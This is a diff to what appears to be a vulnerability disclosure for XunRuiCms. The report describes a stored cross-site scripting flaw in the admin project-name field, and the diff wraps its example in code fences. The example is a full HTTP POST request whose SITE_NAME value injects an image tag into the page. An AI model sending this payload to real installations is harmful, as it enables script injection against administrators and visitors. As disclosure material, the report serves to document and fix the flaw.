@@ -9,7 +9,7 @@
 #### Description：XunRuiCms has a storage type xss vulnerability when editing the project name in the project settings tab after logging into the management backend.
 
 #### Payload used:
-
+```
 POST /admin6318a5072e99.php?c=site_config&m=index&page=0 HTTP/1.1
 Host: 192.168.1.3
 Content-Length: 443
@@ -25,7 +25,7 @@ Cookie: debug-view=show; debug-bar-tab=ci-database; debug-bar-state=minimized; x
 Connection: close
 
 is_form=1&is_admin=1&is_tips=&csrf_test_name=ce1a1cdb6e1e2870bc90e07fb0d624e2&page=0&data%5BSITE_INDEX_HTML%5D=0&data%5BSITE_CLOSE%5D=0&data%5BSITE_CLOSE_MSG%5D=%5Bxss_clean%5D&data%5BSITE_NAME%5D=%E6%88%91%E7%9A%84%E9%A1%B9%E7%9B%AE%3CImg+src%3Dhttp%3A%2F%2F127.0.0.1%3A8000%2Finfo.html%3E&data%5BSITE_LANGUAGE%5D=zh-cn&theme=0&data%5BSITE_THEME%5D=default&data%5BSITE_TEMPLATE%5D=default&data%5BSITE_TIMEZONE%5D=8&data%5BSITE_TIME_FORMAT%5D=
-
+```
 
 #### Example：
 
